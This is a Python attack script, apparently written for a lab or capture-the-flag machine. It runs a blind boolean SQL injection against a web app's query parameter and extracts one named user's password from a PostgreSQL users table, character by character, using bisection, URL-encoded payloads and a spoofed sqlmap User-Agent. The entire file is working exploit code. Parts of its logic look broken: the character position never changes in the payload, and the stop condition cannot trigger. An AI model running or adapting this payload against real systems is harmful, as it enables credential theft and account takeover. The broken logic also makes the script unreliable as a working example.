#!/usr/bin/python3

import requests
import sys
from urllib.parse import quote

# Proxy settings
proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}

# Headers
headers = {
    "Cache-Control": "no-cache",
    "User-Agent": "sqlmap/1.8.5#stable (https://sqlmap.org)",
    "Referer": "http://10.129.231.56:8080/?q=",
    "Host": "10.129.231.56",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive"
}

# Base URL for constructing the query
base_url = "http://10.129.231.56:8080/?q="

# Base payload for the query parameter
base_payload = (
    "%27%2F%2A%2A%2FAND%2F%2A%2A%2FASCII%28SUBSTRING%28%28SELECT%2F%2A%2A%2FCOALESCE%28CAST%28password%2F%2A%2A%2FAS%2F%2A%2A%2FVARCHAR%2810000%29%29%3A%3Atext%2C%28CHR%2832%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2Fpublic.users%2F%2A%2A%2FWHERE%2F%2A%2A%2Femail%3D%28CHR%2865%29%7C%7CCHR%28109%29%7C%7CCHR%28121%29%7C%7CCHR%2846%29%7C%7CCHR%2877%29%7C%7CCHR%2899%29%7C%7CCHR%28119%29%7C%7CCHR%28105%29%7C%7CCHR%28108%29%7C%7CCHR%28108%29%7C%7CCHR%28105%29%7C%7CCHR%2897%29%7C%7CCHR%28109%29%7C%7CCHR%28115%29%7C%7CCHR%2864%29%7C%7CCHR%28112%29%7C%7CCHR%28114%29%7C%7CCHR%28111%29%7C%7CCHR%28116%29%7C%7CCHR%28111%29%7C%7CCHR%28110%29%7C%7CCHR%2846%29%7C%7CCHR%28109%29%7C%7CCHR%28101%29%29%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2Fpassword%2F%2A%2A%2FOFFSET%2F%2A%2A%2F0%2F%2A%2A%2FLIMIT%2F%2A%2A%2F1%29%3A%3Atext%2F%2A%2A%2FFROM%2F%2A%2A%2F7%2F%2A%2A%2FFOR%2F%2A%2A%2F1%29%29%3E%3D{mid}--%2F%2A%2A%2FzThC"
)

# Oracle function to check the query
def oracle(query):
    encoded_query = quote(query, safe='')
    url = f"{base_url}{encoded_query}"
    response = requests.get(url, headers=headers, proxies=proxies)
    return "I work all day" in response.text

# Discover the password one character at a time using a bisection strategy
def discover_password_character(position):
    low = 32  # Space character
    high = 126  # Tilde character
    while low <= high:
        mid = (low + high) // 2
        query = base_payload.format(mid=mid).replace("%7Bposition%7D", str(position))
        if oracle(query):
            low = mid + 1
        else:
            high = mid - 1
    return chr(low)

def discover_password():
    password = ""
    position = 1
    while True:
        character = discover_password_character(position)
        if character == '\x00':  # Null character, assuming the end of the password string
            break
        password += character
        print(f"Character found: {character}")
        print(f"Discovered password so far: {password}")
        sys.stdout.flush()
        position += 1
    return password

# Discover the password
discovered_password = discover_password()
print(f"Discovered password: {discovered_password}")
